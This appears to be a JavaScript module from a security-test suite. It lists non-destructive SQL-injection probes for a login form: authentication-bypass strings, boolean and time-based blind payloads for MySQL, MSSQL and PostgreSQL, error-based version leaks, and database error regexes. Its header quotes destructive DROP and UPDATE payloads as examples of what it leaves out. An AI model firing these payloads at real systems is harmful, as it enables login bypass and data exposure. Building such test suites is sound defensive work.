/**
 * safetest/sqli/lib/payloads.js
 * 登录 SQL 注入的【非破坏性】探针集合。
 *
 * ⚠️ 安全约定：本文件只含「读取 / 布尔 / 报错 / 时间延迟」类 payload，
 *   明确不含 DROP / DELETE / UPDATE / INSERT / TRUNCATE 及任何堆叠写语句——
 *   即便注入成立也不会改动/删除任何数据。这与既有 aitest API-006 里混入的
 *   破坏性 payload（'; DROP TABLE ...、UPDATE ... SET password='hacked'）形成对比，
 *   后者严禁对真实环境使用。
 */

// 鉴权绕过 / 布尔恒真：若 userName 被拼接进鉴权 SQL，可能绕过口令校验直接登录
export const AUTH_BYPASS = [
  { p: "' OR '1'='1", desc: '经典恒真闭合' },
  { p: "' OR '1'='1'-- ", desc: '恒真 + 注释' },
  { p: "' OR '1'='1'#", desc: '恒真 + MySQL 注释' },
  { p: "admin'-- ", desc: '已知用户名 + 注释截断口令' },
  { p: "' OR 1=1-- ", desc: '数字恒真' },
  { p: '" OR "1"="1', desc: '双引号闭合' },
  { p: "') OR ('1'='1", desc: '括号闭合' },
];

// 布尔盲注成对：TRUE 与 FALSE 条件应产生可区分响应（若可注入）
export const BOOLEAN_PAIRS = [
  { t: "' OR '1'='1'-- ", f: "' OR '1'='2'-- ", desc: 'OR 恒真/恒假' },
  { t: "x' AND '1'='1", f: "x' AND '1'='2", desc: 'AND 恒真/恒假' },
];

// 报错型：破坏 SQL 语法，观察是否泄露数据库报错 / 触发 5xx
export const ERROR_BASED = [
  { p: "'", desc: '单引号' },
  { p: '"', desc: '双引号' },
  { p: '\\', desc: '反斜杠' },
  { p: "';", desc: '引号 + 分号' },
  { p: "')", desc: '引号 + 右括号' },
  { p: "' AND extractvalue(1,concat(0x7e,version()))-- ", desc: 'MySQL extractvalue 报错' },
  { p: "' AND 1=CONVERT(int,@@version)-- ", desc: 'MSSQL 类型转换报错' },
];

// 时间盲注注入延迟秒数（判定阈值据此计算）
export const DELAY_SEC = 5;

// 时间盲注：多方言（MySQL / MSSQL / PostgreSQL）。仅延迟，不改数据。
export const TIME_BASED = [
  { p: `' OR SLEEP(${DELAY_SEC})-- `, dbms: 'MySQL', desc: 'OR SLEEP' },
  { p: `' AND SLEEP(${DELAY_SEC})-- `, dbms: 'MySQL', desc: 'AND SLEEP' },
  { p: `'||(SELECT SLEEP(${DELAY_SEC}))||'`, dbms: 'MySQL', desc: '连接子查询 SLEEP' },
  { p: `' AND (SELECT 1 FROM (SELECT SLEEP(${DELAY_SEC}))a)-- `, dbms: 'MySQL', desc: '派生表 SLEEP' },
  { p: `';WAITFOR DELAY '0:0:${DELAY_SEC}'-- `, dbms: 'MSSQL', desc: 'WAITFOR DELAY(堆叠-仅延迟)' },
  { p: `' WAITFOR DELAY '0:0:${DELAY_SEC}'-- `, dbms: 'MSSQL', desc: 'WAITFOR DELAY(内联)' },
  { p: `' OR pg_sleep(${DELAY_SEC})-- `, dbms: 'PostgreSQL', desc: 'pg_sleep' },
  { p: `';SELECT pg_sleep(${DELAY_SEC})-- `, dbms: 'PostgreSQL', desc: 'pg_sleep(堆叠-仅延迟)' },
];

// 0 延迟对照：与时间盲注同形但不延迟，用于排除网络抖动/子查询自身耗时导致的假阳性
export const TIME_CONTROL = [
  { p: `' OR SLEEP(0)-- `, dbms: 'MySQL', desc: 'SLEEP0 对照' },
  { p: `' AND (SELECT 1 FROM (SELECT SLEEP(0))a)-- `, dbms: 'MySQL', desc: '派生表 SLEEP0 对照' },
];

// SQL 数据库报错指纹（报错型判定用）
export const SQL_ERROR_SIGNS = [
  /sql syntax/i,
  /you have an error in your sql/i,
  /mysql/i,
  /mariadb/i,
  /ORA-\d{4,}/i,
  /postgresql/i,
  /pg_query/i,
  /sqlite/i,
  /odbc/i,
  /sql\s*server/i,
  /unclosed quotation/i,
  /quoted string not properly terminated/i,
  /syntax error/i,
  /System\.Data\.SqlClient/i,
  /Warning.*mysqli/i,
  /supplied argument is not a valid/i,
];
